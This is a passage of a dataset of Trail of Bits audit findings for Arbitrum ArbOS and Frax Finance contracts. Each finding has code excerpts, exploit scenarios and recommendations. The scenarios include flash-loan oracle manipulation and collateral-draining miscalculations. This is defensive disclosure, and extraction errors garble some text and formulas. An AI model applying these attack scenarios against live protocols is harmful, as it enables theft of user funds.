by the Ochain team, other important assumptions need to be broken; for example, the WASM module root would need to be malicious. There are other similar discrepancies between the checks performed by the arbitrator and the OneStepProverO contract. For example, when handling the argumentData value for the Call operation, the contract checks the result of the downcast to ensure there is no precision loss (gure 1.3), but the arbitrator does not (gure 1.4). The arbitrator does not perform this check in the ArbitraryJump and ArbitraryJumpIf operations, either. function executeCall( Machine memory mach, Module memory, Instruction calldata inst, bytes calldata ) internal pure { ... // Jump to the target uint32 idx = uint32(inst.argumentData); require(idx == inst.argumentData, \"BAD_CALL_DATA\"); ... } Figure 1.3: A snippet of the executeCall function in OneStepProver0.sol#L117-L136 pub fn step_n(&mut self, n: u64) -> Result<()> { ... Opcode::Call => { let current_frame = self.frame_stack.last().unwrap(); self.value_stack.push(Value::InternalRef(self.pc)); self.value_stack .push(Value::I32(current_frame.caller_module)); self.value_stack .push(Value::I32(current_frame.caller_module_internals)); self.pc.func = inst.argument_data as u32; self.pc.inst = 0; func = &module.funcs[self.pc.func()]; } ... } Figure 1.4: A snippet of the Call function in machine.rs#L1466-L1476 Recommendations Short term, in the arbitrators step_n function, move the preimage_ty variable inside the if/let block so that it performs the same order of checks as the OneStepProverHostIo contracts executeReadPreImage function. Add the missing downcast result check to the arbitrators Call, ArbitraryJump, and ArbitraryJumpIf opcodes. Long term, when implementing the same logic multiple times, such as in these cases, make sure to implement it in the same way, even if divergences would be safe, to simplify the review process.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Missing ArbOS 20 gate on newly added GetScheduledUpgrade function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-offchainlabsarbos-securityreview.pdf", "body": "A new function, GetScheduledUpgrade, was added to the ArbOwnerPublic precompiled contract in ArbOS 20; however, it does not include an arbosVersion value to indicate that it is callable starting only from that ArbOS version. This could lead to state divergences when transactions are replayed during syncs. When a new function is added to a custom precompiled contract or when an altogether new precompiled contract is added in a new ArbOS version, that new function or contract must check that it cannot be called before it is activated. As shown in gure 2.1, the Precompiles function returns the precompiled contracts present in the system; each function in a precompiled contract has an associated arbosVersion, indicating the minimum, active ArbOS version necessary for the call to succeed. func Precompiles() map[addr]ArbosPrecompile { ... ArbOwnerPublic := insert(MakePrecompile(templates.ArbOwnerPublicMetaData, &ArbOwnerPublic{Address: hex(\"6b\")})) ArbOwnerPublic.methodsByName[\"GetInfraFeeAccount\"].arbosVersion = 5 ArbOwnerPublic.methodsByName[\"RectifyChainOwner\"].arbosVersion = 11 ArbOwnerPublic.methodsByName[\"GetBrotliCompressionLevel\"].arbosVersion = 20 ... } Figure 2.1: A snippet of the Precompiles function in precompile.go#L559-L562 The arbosVersion is not set for the GetScheduledUpgrade function, allowing transactions made on ArbOS versions prior to 20 to call it. Exploit Scenario Eve calls the GetScheduledUpgrade function in the ArbOwnerPublic precompiled contract before ArbOS 20 is activated, and the transaction correctly reverts. When ArbOS 20 is activated, the same transaction succeeds, leading to a state divergence. Recommendations Short term, make the GetScheduledUpgrade function present in the system starting only from ArbOS 20. Long term, add tests that attempt to call new functions added to precompiled contracts prior to the upgrade and ensure that a node can replay the historical transaction following an ArbOS upgrade without causing a state divergence. Note that this issue was discovered during week 1 of our review; Ochain xed the issue during the audit, and we incorporated that x into the scope of week 2.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "3. Unclear implementations of MaxInitCodeSize and MaxCodeSize restrictions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-offchainlabsarbos-securityreview.pdf", "body": "The validations shown in gure 3.1 and gure 3.2 check that the length of msg.Data and the created contract are less than MaxInitCodeSize and MaxCodeSize, respectively. However, MaxInitCodeSize and MaxCodeSize are cast to signed integers; if they are set to values greater than 263, their signed representation will be negative; all inputs will succeed, given that their lengths will always be greater than a negative value. In practice, these checks would function the same if the lengths of msg.Data and the created contract were cast to an unsigned integer instead. This is because all possible length values will succeed up to the system and language runtimes memory limits if the limits are congured to 263. Nevertheless, it would be more clear to cast the slice lengths to an unsigned integer than to rely on this subtly. func (st *StateTransition) TransitionDb() (*ExecutionResult, error) { ... // Check whether the init code size has been exceeded. if rules.IsShanghai && contractCreation && len(msg.Data) > int(st.evm.ChainConfig().MaxInitCodeSize()) { return nil, fmt.Errorf(\"%w: code size %v limit %v\", ErrMaxInitCodeSizeExceeded, len(msg.Data), int(st.evm.ChainConfig().MaxInitCodeSize())) } ... } Figure 3.1: A snippet of the TransitionDb function in state_transition.go#L450-L453 func (evm *EVM) create(caller ContractRef, codeAndHash *codeAndHash, gas uint64, value *big.Int, address common.Address, typ OpCode) ([]byte, common.Address, uint64, error) { ... // Check whether the max code size has been exceeded, assign err if the case. if err == nil && evm.chainRules.IsEIP158 && len(ret) > int(evm.chainConfig.MaxCodeSize()) { err = ErrMaxCodeSizeExceeded } ... } Figure 3.2: A snippet of the create function in evm.go#L507-L510 Recommendations Short term, have the two aected functions cast the lengths of msg.Data and the created contract to an unsigned integer instead of MaxInitCodeSize and MaxCodeSize to a signed integer. Long term, when casting an unsigned integer to signed, always keep in mind that, depending on the values it can have, the cast value could have a negative sign. Additionally, when adding or changing conditions from the original go-ethereum codebase, make sure to add tests with values on the boundaries.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Rejection of unsupported transaction types is untested and fragile ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-offchainlabsarbos-securityreview.pdf", "body": "Since Arbitrum Nitro will not support the storage of blob data in ArbOS 20, blob transaction types are rejected, and a validation is used throughout the codebase that throws an error if such transaction types are used, as shown in gures 4.1, 4.2, and 4.3. However, this validation code is currently untested, and the implementation would be more robust and future-proof if it processed only transactions that are explicitly accepted instead. That way, if an unsupported transaction type is added in the upstream go-ethereum implementation, the Ochain team can consider what other changes may be necessary before allowing Arbitrum Nitro to accept it. if err := newTx.UnmarshalBinary(readBytes); err != nil { return nil, err } if newTx.Type() >= types.ArbitrumDepositTxType || newTx.Type() == types.BlobTxType { // Should be unreachable for Arbitrum types due to UnmarshalBinary not accepting Arbitrum internal txs // and we want to disallow BlobTxType since Arbitrum doesn't support EIP-4844 txs yet. return nil, types.ErrTxTypeNotSupported } Figure 4.1: Transaction types that are blacklisted (arbos/parse_l2.go#165172) if tx.Type() >= types.ArbitrumDepositTxType || tx.Type() == types.BlobTxType { // Should be unreachable for Arbitrum types due to UnmarshalBinary not accepting Arbitrum internal txs // and we want to disallow BlobTxType since Arbitrum doesn't support EIP-4844 txs yet. return types.ErrTxTypeNotSupported } Figure 4.2: Another place where the validation is used (nitro/execution/gethexec/sequencer.go#396400) if tx.Type() >= types.ArbitrumDepositTxType || tx.Type() == types.BlobTxType { // Should be unreachable for Arbitrum types due to UnmarshalBinary not accepting Arbitrum internal txs // and we want to disallow BlobTxType since Arbitrum doesn't support EIP-4844 txs yet. return types.ErrTxTypeNotSupported } Figure 4.3: Another place where the validation is used (nitro/execution/gethexec/tx_pre_checker.go#119123) Recommendations Short term, add tests to ensure this guard works as expected and to mitigate regressions. Long term, consider having the implementation explicitly accept certain transaction types so that it does not incidentally process unsupported transaction types following merges and upgrades from upstream. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Testing is not routine ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Frax Solidity repository does not have reproducible tests that can be run locally. Having reproducible tests is one of the best ways to ensure a codebases functional correctness. This nding is based on the following events:    We tried to carry out the instructions in the Frax Solidity README at commit 31dd816 . We were unsuccessful. We reached out to Frax Finance for assistance. Frax Finance in turn pushed eight additional commits to the Frax Solidity repository (not counting merge commits). With these changes, we were able to run some of the tests, but not all of them. These events suggest that tests require substantial eort to run (as evidenced by the eight additional commits), and that they were not functional at the start of the assessment. Exploit Scenario Eve exploits a aw in a Frax Solidity contract. The aw would likely have been revealed through unit tests. Recommendations Short term, develop reproducible tests that can be run locally for all contracts. A comprehensive set of unit tests will help expose errors, protect against regressions, and provide a sort of documentation to users. Long term, incorporate unit testing into the CI process:   Run the tests specic to contract X when a push or pull request aects contract X. Run all tests before deploying any new code, including updates to existing contracts. Automating the testing process will help ensure the tests are run regularly and consistently.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "2. No clear mapping from contracts to tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "There are 405 Solidity les within the contracts folder 1 , but there are only 80 les within the test folder 2 . Thus, it is not clear which tests correspond to which contracts. The number of contracts makes it impractical for a developer to run all tests when working on any one contract. Thus, to test a contract eectively, a developer will need to know which tests are specic to that contract. Furthermore, as per TOB-FRSOL-001 , we recommend that the tests specic to contract X be run when a push or pull request aects contract X. To apply this recommendation, a mapping from the contracts to their relevant tests is needed. Exploit Scenario Alice, a Frax Finance developer, makes a change to a Frax Solidity contract. Alice is unable to determine the le that should be used to test the contract and deploys the contract untested. The contract is exploited using a bug that would have been revealed by a test. Recommendations Short term, for each contract, produce a list of tests that exercise that contract. If any such list is empty, produce tests for that contract. Having such lists will help facilitate contract testing following a change to it. Long term, as per TOB-FRSOL-001 , incorporate unit testing into the CI process by running the tests specic to contract X when a push or pull request aects contract X. Automating the testing process will help ensure the tests are run regularly and consistently. 1 find contracts -name '*.sol' | wc -l 2 find test -type f | wc -l", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "3. amoMinterBorrow cannot be paused ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The amoMinterBorrow function does not check for any of the paused ags or whether the minters associated collateral type is enabled. This reduces the FraxPoolV3 custodians ability to limit the scope of an attack. The relevant code appears in gure 3.1. The custodian can set recollateralizePaused[minter_col_idx] to true if there is a problem with recollateralization, and collateralEnabled[minter_col_idx] to false if there is a problem with the specic collateral type. However, amoMinterBorrow checks for neither of these. // Bypasses the gassy mint->redeem cycle for AMOs to borrow collateral function amoMinterBorrow ( uint256 collateral_amount ) external onlyAMOMinters { // Checks the col_idx of the minter as an additional safety check uint256 minter_col_idx = IFraxAMOMinter ( msg.sender ). col_idx (); // Transfer TransferHelper. safeTransfer (collateral_addresses[minter_col_idx], msg.sender , collateral_amount); } Figure 3.1: contracts/Frax/Pools/FraxPoolV3.sol#L552-L559 Exploit Scenario Eve discovers and exploits a bug in an AMO contract. The FraxPoolV3 custodian discovers the attack but is unable to stop it. The FraxPoolV3 owner is required to disable the AMO contracts. This occurs after signicant funds have been lost. Recommendations Short term, require recollateralizePaused[minter_col_idx] to be false and collateralEnabled[minter_col_idx] to be true for a call to amoMinterBorrow to succeed. This will help the FraxPoolV3 custodian to limit the scope of an attack. Long term, regularly review all uses of contract modiers, such as collateralEnabled . Doing so will help to expose bugs like the one described here.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Array updates are not constant time ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "In several places, arrays are allowed to grow without bound, and those arrays are searched linearly. If an array grows too large and the block gas limit is too low, such a search would fail. An example appears in gure 4.1. Minters are pushed to but never popped from minters_array . When a minter is removed from the array, its entry is searched for and then set to 0 . Note that the cost of such a search is proportional to the searched-for entrys index within the array. Thus, there will eventually be entries that cannot be removed under the current block gas limits because their positions within the array are too large. function removeMinter ( address minter_address ) external onlyByOwnGov { require (minter_address != address ( 0 ), \"Zero address detected\" ); require (minters[minter_address] == true , \"Address nonexistant\" ); // Delete from the mapping delete minters[minter_address]; // 'Delete' from the array by setting the address to 0x0 for ( uint i = 0 ; i < minters_array.length; i++){ if (minters_array[i] == minter_address) { minters_array[i] = address ( 0 ); // This will leave a null in the array and keep the indices the same break ; } } emit MinterRemoved (minter_address); } Figure 4.1: contracts/ERC20/__CROSSCHAIN/CrossChainCanonical.sol#L269-L285 Note that occasionally popping values from minters_array is not sucient to address the issue. An array can be popped from occasionally, yet its size can still be unbounded. A similar problem exists in CrossChainCanonical.sol with respect to bridge_tokens_array . This problem appears to exist in many parts of the codebase. Exploit Scenario Eve tricks Frax Finance into adding her minter to the CrosschainCanonical contract. Frax Finance later decides to remove her minter, but is unable to do so because minters_array has grown too large and block gas limits are too low. Recommendations Short term, enforce the following policy throughout the codebase: an arrays size is bounded, or the array is linearly searched, but never both. Arrays that grow without bound can be updated by moving computations, such as the computation of the index that needs to be updated, o-chain. Alternatively, the code that uses the array could be adjusted to eliminate the need for the array or to instead use a linked list. Adopting these changes will help ensure that the success of critical operations is not dependent on block gas limits. Long term, incorporate a check for this problematic code pattern into the CI pipeline. In the medium term, such a check might simply involve regular expressions. In the longer term, use Semgrep for Solidity if or when such support becomes stable. This will help to ensure the problem is not reintroduced into the codebase.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "5. Incorrect calculation of collateral amount in redeemFrax ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The redeemFrax function of the FraxPoolV3 contract multiplies a FRAX amount with the collateral price to calculate the equivalent collateral amount (see the highlights in gure 5.1). This is incorrect. The FRAX amount should be divided by the collateral price instead. Fortunately, in the current deployment of FraxPoolV3 , only stablecoins are used as collateral, and their price is set to 1 (also see issue TOB-FRSOL-009 ). This mitigates the issue, as multiplication and division by one are equivalent. If the collateral price were changed to a value dierent from 1 , the exploit scenario described below would become possible, enabling users to steal all collateral from the protocol. if (global_collateral_ratio >= PRICE_PRECISION) { // 1-to-1 or overcollateralized collat_out = frax_after_fee .mul(collateral_prices[col_idx]) .div( 10 ** ( 6 + missing_decimals[col_idx])); // PRICE_PRECISION + missing decimals fxs_out = 0 ; } else if (global_collateral_ratio == 0 ) { // Algorithmic fxs_out = frax_after_fee .mul(PRICE_PRECISION) .div(getFXSPrice()); collat_out = 0 ; } else { // Fractional collat_out = frax_after_fee .mul(global_collateral_ratio) .mul(collateral_prices[col_idx]) .div( 10 ** ( 12 + missing_decimals[col_idx])); // PRICE_PRECISION ^2 + missing decimals fxs_out = frax_after_fee .mul(PRICE_PRECISION.sub(global_collateral_ratio)) .div(getFXSPrice()); // PRICE_PRECISIONS CANCEL OUT } Figure 5.1: Part of the redeemFrax function ( FraxPoolV3.sol#412433 ) When considering the    of an entity  , it is common to think of it as the amount of another entity  or  s per  . that has a value equivalent to 1  . The unit of measurement of    is   , For example, the price of one apple is the number of units of another entity that can be exchanged for one unit of apple. That other entity is usually the local currency. For the US, the price of an apple is the number of US dollars that can be exchanged for an apple:   = $  .  1. Given a    and an amount of    , one can compute the equivalent     through multiplication:    =     .    2. Given a    and an amount of    , one can compute the equivalent     through division: =       /   .  In short, multiply if the known amount and price refer to the same entity; otherwise, divide. The getFraxInCollateral function correctly follows rule 2 by dividing a FRAX amount by the collateral price to get the equivalent collateral amount (gure 5.2). function getFRAXInCollateral ( uint256 col_idx , uint256 frax_amount ) public view returns ( uint256 ) { return frax_amount.mul(PRICE_PRECISION).div( 10 ** missing_decimals[col_idx]). div(collateral_prices[col_idx]) ; } Figure 5.2: The getFraxInCollateral function ( FraxPoolV3.sol#242244 ) Exploit Scenario A collateral price takes on a value other than 1 . This can happen through either a call to setCollateralPrice or future modications that fetch the price from an oracle (also see issue TOB-FRSOL-009 ). A collateral asset is worth $1,000. Alice mints 1,000 FRAX for 1 unit of collateral. Alice then redeems 1,000 FRAX for 1 million units of collateral ( ). As a result, Alice has stolen around $1 billion from the protocol. If the calculation were 1000 / 1000 correct, Alice would have redeemed her 1,000 FRAX for 1 unit of collateral ( 1000  1000 ). Recommendations Short term, in FraxPoolV3.redeemFrax , use the existing getFraxInCollateral helper function (gure 5.2) to compute the collateral amount that is equivalent to a given FRAX amount. Long term, verify that all calculations involving prices use the above rules 1 and 2 correctly.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. spotPriceOHM is vulnerable to manipulation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The OHM_AMO contract uses the Uniswap V2 spot price to calculate the value of the collateral that it holds. This price can be manipulated by making a large trade through the OHM-FRAX pool. An attacker can manipulate the apparent value of collateral and thereby change the collateralization rate at will. FraxPoolV3 appears to contain the most funds at risk, but any contract that uses FRAX.globalCollateralValue is susceptible to a similar attack. (It looks like Pool_USDC has buybacks paused, so it should not be able to burn FXS, at the time of writing.) function spotPriceOHM () public view returns ( uint256 frax_per_ohm_raw , uint256 frax_per_ohm ) { ( uint256 reserve0 , uint256 reserve1 , ) = (UNI_OHM_FRAX_PAIR.getReserves()); // OHM = token0, FRAX = token1 frax_per_ohm_raw = reserve1.div(reserve0); frax_per_ohm = reserve1.mul(PRICE_PRECISION).div(reserve0.mul( 10 ** missing_decimals_ohm)); } Figure 6.1: old_contracts/Misc_AMOs/OHM_AMO.sol#L174-L180 FRAX.globalCollateralValue loops through frax_pools_array , including OHM_AMO , and aggregates collatDollarBalance . The collatDollarBalance for OHM_AMO is calculated using spotPriceOHM and thus is vulnerable to manipulation. function globalCollateralValue() public view returns ( uint256 ) { uint256 total_collateral_value_d18 = 0 ; for ( uint i = 0 ; i < frax_pools_array.length; i++){ // Exclude null addresses if (frax_pools_array[i] != address ( 0 )){ total_collateral_value_d18 = total_collateral_value_d18.add(FraxPool(frax_pools_array[i]).collatDollarBalance()); } } return total_collateral_value_d18; } Figure 6.2: contracts/Frax/Frax.sol#L180-L191 buyBackAvailableCollat returns the amount the protocol will buy back if the aggregate value of collateral appears to back each unit of FRAX with more than is required by the current collateral ratio. Since globalCollateralValue is manipulable, the protocol can be articially forced into buying (burning) FXS shares and paying out collateral. function buybackAvailableCollat () public view returns ( uint256 ) { uint256 total_supply = FRAX.totalSupply(); uint256 global_collateral_ratio = FRAX.global_collateral_ratio(); uint256 global_collat_value = FRAX.globalCollateralValue(); if (global_collateral_ratio > PRICE_PRECISION) global_collateral_ratio = PRICE_PRECISION; // Handles an overcollateralized contract with CR > 1 uint256 required_collat_dollar_value_d18 = (total_supply.mul(global_collateral_ratio)).div(PRICE_PRECISION); // Calculates collateral needed to back each 1 FRAX with $1 of collateral at current collat ratio if (global_collat_value > required_collat_dollar_value_d18) { // Get the theoretical buyback amount uint256 theoretical_bbk_amt = global_collat_value.sub(required_collat_dollar_value_d18); // See how much has collateral has been issued this hour uint256 current_hr_bbk = bbkHourlyCum[curEpochHr()]; // Account for the throttling return comboCalcBbkRct(current_hr_bbk, bbkMaxColE18OutPerHour, theoretical_bbk_amt); } else return 0 ; } Figure 6.3: contracts/Frax/Pools/FraxPoolV3.sol#L284-L303 buyBackFXS calculates the amount of FXS to burn from the user, calls b urn on the FRAXShares contract, and sends the caller an equivalent dollar amount in USDC. function buyBackFxs ( uint256 col_idx , uint256 fxs_amount , uint256 col_out_min ) external collateralEnabled(col_idx) returns ( uint256 col_out ) { require (buyBackPaused[col_idx] == false , \"Buyback is paused\" ); uint256 fxs_price = getFXSPrice(); uint256 available_excess_collat_dv = buybackAvailableCollat(); // If the total collateral value is higher than the amount required at the current collateral ratio then buy back up to the possible FXS with the desired collateral require (available_excess_collat_dv > 0 , \"Insuf Collat Avail For BBK\" ); // Make sure not to take more than is available uint256 fxs_dollar_value_d18 = fxs_amount.mul(fxs_price).div(PRICE_PRECISION); require (fxs_dollar_value_d18 <= available_excess_collat_dv, \"Insuf Collat Avail For BBK\" ); // Get the equivalent amount of collateral based on the market value of FXS provided uint256 collateral_equivalent_d18 = fxs_dollar_value_d18.mul(PRICE_PRECISION).div(collateral_prices[col_idx]); col_out = collateral_equivalent_d18.div( 10 ** missing_decimals[col_idx]); // In its natural decimals() // Subtract the buyback fee col_out = (col_out.mul(PRICE_PRECISION.sub(buyback_fee[col_idx]))).div(PRICE_PRECISION); // Check for slippage require (col_out >= col_out_min, \"Collateral slippage\" ); // Take in and burn the FXS, then send out the collateral FXS.pool_burn_from( msg.sender , fxs_amount); TransferHelper.safeTransfer(collateral_addresses[col_idx], msg.sender , col_out); // Increment the outbound collateral, in E18, for that hour // Used for buyback throttling bbkHourlyCum[curEpochHr()] += collateral_equivalent_d18; } Figure 6.4: contracts/Frax/Pools/FraxPoolV3.sol#L488-L517 recollateralize takes collateral from a user and gives the user an equivalent amount of FXS, including a bonus. Currently, the bonus_rate is set to 0 , but a nonzero bonus_rate would signicantly increase the protability of an attack. // When the protocol is recollateralizing, we need to give a discount of FXS to hit the new CR target // Thus, if the target collateral ratio is higher than the actual value of collateral, minters get FXS for adding collateral // This function simply rewards anyone that sends collateral to a pool with the same amount of FXS + the bonus rate // Anyone can call this function to recollateralize the protocol and take the extra FXS value from the bonus rate as an arb opportunity function recollateralize( uint256 col_idx, uint256 collateral_amount, uint256 fxs_out_min) external collateralEnabled(col_idx) returns ( uint256 fxs_out) { require (recollateralizePaused[col_idx] == false , \"Recollat is paused\" ); uint256 collateral_amount_d18 = collateral_amount * ( 10 ** missing_decimals[col_idx]); uint256 fxs_price = getFXSPrice(); // Get the amount of FXS actually available (accounts for throttling) uint256 fxs_actually_available = recollatAvailableFxs(); // Calculated the attempted amount of FXS fxs_out = collateral_amount_d18.mul(PRICE_PRECISION.add(bonus_rate).sub(recollat_fee[col_idx]) ).div(fxs_price); // Make sure there is FXS available require (fxs_out <= fxs_actually_available, \"Insuf FXS Avail For RCT\" ); // Check slippage require (fxs_out >= fxs_out_min, \"FXS slippage\" ); // Don't take in more collateral than the pool ceiling for this token allows require (freeCollatBalance(col_idx).add(collateral_amount) <= pool_ceilings[col_idx], \"Pool ceiling\" ); // Take in the collateral and pay out the FXS TransferHelper.safeTransferFrom(collateral_addresses[col_idx], msg.sender , address ( this ), collateral_amount); FXS.pool_mint( msg.sender , fxs_out); // Increment the outbound FXS, in E18 // Used for recollat throttling rctHourlyCum[curEpochHr()] += fxs_out ; } Figure 6.5: contracts/Frax/Pools/FraxPoolV3.sol#L519-L550 Exploit Scenario FraxPoolV3.bonus_rate is nonzero. Using a ash loan, an attacker buys OHM with FRAX, drastically increasing the spot price of OHM. When FraxPoolV3.buyBackFXS is called, the protocol incorrectly determines that FRAX has gained additional collateral. This causes the pool to burn FXS shares and to send the attacker USDC of the equivalent dollar value. The attacker moves the price in the opposite direction and calls recollateralize on the pool, receiving and selling newly minted FXS, including a bonus, for prot. This attack can be carried out until the buyback and recollateralize hourly cap, currently 200,000 units, is reached. Recommendations Short term, take one of the following steps to mitigate this issue:   Call FRAX.removePool and remove OHM_AMO . Note, this may cause the protocol to become less collateralized. Call FraxPoolV3.setBbkRctPerHour and set bbkMaxColE18OutPerHour and rctMaxFxsOutPerHour to 0 . Calling toggleMRBR to pause USDC buybacks and recollateralizations would have the same eect. The implications of this mitigation on the long-term sustainability of the protocol are not clear. Long term, do not use the spot price to determine collateral value. Instead, use a time-weighted average price (TWAP) or an oracle such as Chainlink. If a TWAP is used, ensure that the underlying pool is highly liquid and not easily manipulated. Additionally, create a rigorous process to onboard collateral since an exploit of this nature could destabilize the system. References  samczsun, \"So you want to use a price oracle\"  euler-xyz/uni-v3-twap-manipulation", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "7. Return values of the Chainlink oracle are not validated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The latestRoundData function returns a signed integer that is coerced to an unsigned integer without checking that the value is a positive integer. An overow (e.g., uint(-1) ) would drastically misrepresent the price and cause unexpected behavior. In addition, FraxPoolV3 does not validate the completion and recency of the round data, permitting stale price data that does not reect recent changes. function getFRAXPrice() public view returns ( uint256 ) { ( , int price, , , ) = priceFeedFRAXUSD.latestRoundData(); return uint256 (price).mul(PRICE_PRECISION).div( 10 ** chainlink_frax_usd_decimals); } function getFXSPrice() public view returns ( uint256 ) { ( , int price, , , ) = priceFeedFXSUSD.latestRoundData(); return uint256 (price).mul(PRICE_PRECISION).div( 10 ** chainlink_fxs_usd_decimals); } Figure 7.1: contracts/Frax/Pools/FraxPoolV3.sol#231239 An older version of Chainlinks oracle interface has a similar function, latestAnswer . When this function is used, the return value should be checked to ensure that it is a positive integer. However, round information does not need to be checked because latestAnswer returns only price data. Recommendations Short term, add a check to latestRoundData and similar functions to verify that values are non-negative before converting them to unsigned integers, and add an invariant that checks that the round has nished and that the price data is from the current round: require(updatedAt != 0 && answeredInRound == roundID) . Long term, dene a minimum update threshold and add the following check: require((block.timestamp - updatedAt <= minThreshold) && (answeredInRound == roundID)) . Furthermore, use consistent interfaces instead of mixing dierent versions. References  Chainlink AggregatorV3Interface", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Unlimited arbitrage in CCFrax1to1AMM ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The CCFrax1to1AMM contract implements an automated market maker (AMM) with a constant price and zero slippage. It is a constant sum AMM that maintains the invariant  =  +  , where the token balances. must remain constant during swaps (ignoring fees) and and    are Constant sum AMMs are impractical because they are vulnerable to unlimited arbitrage. If the price dierence of the AMMs tokens in external markets is large enough, the most protable arbitrage strategy is to buy the total reserve of the more expensive token from the AMM, leaving the AMM entirely imbalanced. Other AMMs like Uniswap and Curve prevent unlimited arbitrage by making the price depend on the reserves. This limits prots from arbitrage to a fraction of the total reserves, as the price will eventually reach a point at which the arbitrage opportunity disappears. No such limit exists in the CCFrax1to1AMM contract. While arbitrage opportunities are somewhat limited by the token caps, fees, and gas prices, unlimited arbitrage is always possible once the reserves or the dierence between the FRAX price and the token price becomes large enough. While token_price swings are limited by the price_tolerance parameter, frax_price swings are not limited. Exploit Scenario The CCFrax1to1AMM contract is deployed, and price_tolerance is set to 0.05. A token  is whitelisted with a token_cap of 100,000 and a swap_fee of 0.0004. A user transfers 100,000 FRAX to an AMM. The price of minimum at which the AMM allows swaps, and the price of FRAX in an external market becomes 1.005. Alice buys (or takes out a ash loan of) $100,000 worth of market. Alice swaps all of her external market, making a prot of $960. No FRAX remains in the AMM. in the external for FRAX with the AMM and then sells all of her FRAX in the in an external market becomes 0.995, the    This scenario is conservative, as it assumes a balance of only 100,000 FRAX and a frax_price of 1.005. As frax_price and the balance increase, the arbitrage prot increases. Recommendations Short term, do not deploy CCFrax1to1AMM and do not fund any existing deployments with signicant amounts. Those funds will be at risk of being drained through arbitrage. Long term, when providing stablecoin-to-stablecoin liquidity, use a Curve pool or another proven and audited implementation of the stableswap invariant.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "9. Collateral prices are assumed to always be $1 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "In the FraxPoolV3 contract, the setCollateralPrice function sets collateral prices and stores them in the collateral_prices mapping. As of December 13, 2021, collateral prices are set to $1 for all collateral types in the deployed version of the FraxPoolV3 contract. Currently, only stablecoins are used as collateral within the Frax Protocol. For those stablecoins, $1 is an appropriate price approximation, at most times. However, when the actual price of the collateral diers enough from $1, users could choose to drain value from the protocol through arbitrage. Conversely, during such price uctuations, other users who are not aware that FraxPoolV3 assumes collateral prices are always $1 can receive less value than expected. Collateral tokens that are not pegged to a specic value, like ETH or WBTC, cannot currently be used safely within FraxPoolV3 . Their prices are too volatile, and repeatedly calling setCollateralPrice is not a feasible solution to keeping their prices up to date. Exploit Scenario The price of FEI, one of the stablecoins collateralizing the Frax Protocol, changes to $0.99. Alice, a user, can still mint FRAX/FXS as if the price of FEI were $1. Ignoring fees, Alice can buy 1 million FEI for $990,000, mint 1 million FRAX/FXS with the 1 million FEI, and sell the 1 million FRAX/FXS for $1 million, making $10,000 in the process. As a result, the Frax Protocol loses $10,000. If the price of FEI changes to $1.01, Bob would expect that he can exchange his 1 million FEI for 1.01 million FRAX/FXS. Since FraxPoolV3 is not aware of the actual price of FEI, Bob receives only 1 million FRAX/FXS, incurring a 1% loss. Recommendations Short term, document the arbitrage opportunities described above. Warn users that they could lose funds if collateral prices dier from $1. Disable the option to set collateral prices to values not equal to $1. Long term, modify the FraxPoolV3 contract so that it fetches collateral prices from a price oracle.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "10. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "Frax Finance has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc -js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Frax Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "11. Users are unable to limit the amount of collateral paid to FraxPoolV3 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The amount of collateral and FXS that is paid by the user in mintFrax is dynamically computed from the collateral ratio and price. These parameters can change between transaction creation and transaction execution. Users currently have no way to ensure that the paid amounts are still within acceptable limits at the time of transaction execution. Exploit Scenario Alice wants to call mintFrax . In the time between when the transaction is 